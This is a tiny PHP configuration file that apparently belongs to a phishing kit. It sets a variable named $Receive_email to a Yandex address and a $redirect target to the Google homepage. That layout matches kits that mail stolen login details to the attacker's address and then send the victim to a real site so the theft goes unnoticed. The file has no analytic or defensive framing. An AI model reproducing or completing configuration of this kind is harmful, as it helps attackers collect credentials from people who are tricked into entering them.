<?php 
$Receive_email="micheallawrence077@yandex.com";
$redirect="https://www.google.com/";
?>